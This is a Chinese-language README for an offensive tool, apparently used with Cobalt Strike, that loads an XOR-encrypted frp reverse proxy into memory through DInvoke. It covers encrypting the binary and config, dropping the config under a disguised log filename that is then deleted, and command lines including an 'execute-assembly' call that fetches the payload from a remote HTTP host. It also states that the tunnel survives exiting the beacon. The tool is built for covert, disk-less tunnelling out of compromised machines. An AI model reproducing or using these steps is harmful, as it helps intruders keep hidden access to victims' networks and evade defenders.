# DInvokeFrp
内存加载FRP

1.简介
通过加载器内存加载frp，实现frp不落地上线。
运行过程中，会落地加密配置文件，读取完配置文件后，会自动删除。
落地配置 C:\\Windows\\Temp\\uxfFXSTIFFDebugLogFile.log


2.使用
0x1 配置
00x1 使用XORTool进行frp加密
选择需要加密的frp文件，默认文件加密密钥为duxaz

<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/2e3be9ed-5491-44dc-8429-3075b1752770">


00x2 使用XORTool 进行配置加密
修改frp配置参数，获取加密配置
<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/38f6570d-719e-46e3-9583-42d6b3329512">


00x3 使用方式
参数配置，不要修改顺序
本地加载
使用默认文件加密key
DInvokeSU.exe --file C:\users\public\main.bin 加密配置 

修改加密key上线
DInvokeSU.exe --file C:\users\public\main.bin 加密配置 --key 加密密钥
<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/2ffd45f2-7263-4749-8cdb-fbab66578341">



远程加载
使用默认文件加密key
DInvokeSU.exe --url C:\users\public\main.bin 加密配置 

修改加密key上线
DInvokeSU.exe --file C:\users\public\main.bin 加密配置 --key 加密密钥
<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/5eb07fe0-0416-46b4-aeea-177d13a0a831">


execute-assembly纯内存加载
远程加载加密frp
execute-assembly DInvokeSU.exe --url http://192.168.124.1:8080/main.bin 加密配置 --key duxaz

<img width="416" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/3e2338f2-fc43-4f75-9dc4-01fdbae8507d">


落地加密frp
execute-assembly DInvokeSU.exe --file C:\Users\Public\main.bin 加密配置 --key duxaz

<img width="416" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/c130190f-246d-4f8b-b1d6-48f953758a3e">


效果

<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/bc0ddc61-54f6-4ae6-9d2d-0a2745756851">
<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/a52ed17b-976d-42cf-b89d-5b8936598a78">



退出beacon，为主进程，内存frp不会掉线
<img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/664b19d6-4faf-4f10-ba91-0883b680247b">

参考链接
https://github.com/TheWover/DInvoke
https://github.com/fatedier/frp
